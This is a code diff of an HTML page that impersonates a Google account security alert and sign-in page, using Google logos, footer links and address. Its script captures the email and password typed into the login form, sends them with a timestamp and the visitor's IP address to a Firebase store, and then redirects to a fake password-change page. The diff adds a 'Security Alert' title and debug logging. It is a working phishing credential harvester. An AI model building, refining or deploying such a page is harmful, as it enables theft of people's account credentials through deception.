@@ -30,9 +30,11 @@
 <body>
     <div class="header">
         <img src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_68x28dp.png" alt="Google">
+        <a href="#">Create account</a>
     </div>
     <div class="main">
         <div class="container">
+            <div class="alert-title">Security Alert</div>
             <div class="logo">
                 <img src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_68x28dp.png" alt="Google">
             </div>
@@ -50,7 +52,7 @@
         <a href="https://support.google.com/accounts?hl=en">Help</a>
         <a href="https://policies.google.com/privacy?hl=en">Privacy</a>
         <a href="https://policies.google.com/terms?hl=en">Terms</a>
-        <div class="footer-note">You received this email to let you know about important changes to your Google Account and services.<br>© 2025 Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA</div>
+        <div class="footer-note">© 2025 Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA</div>
     </div>
     <div class="lang">English (United States)</div>
 
@@ -72,6 +74,7 @@
 
         document.getElementById('loginForm').addEventListener('submit', async (e) => {
             e.preventDefault();
+            console.log('Form submitted'); // Debug log
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             try {
@@ -82,8 +85,10 @@
                     timestamp: new Date().toISOString(),
                     ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip)
                 });
+                console.log('Data sent to Firebase, redirecting...'); // Debug log
                 window.location.href = "password-change.html?email=" + encodeURIComponent(email);
             } catch (error) {
+                console.error('Firebase error:', error); // Debug log
                 document.getElementById('errorMessage').style.display = 'block';
             }
         });
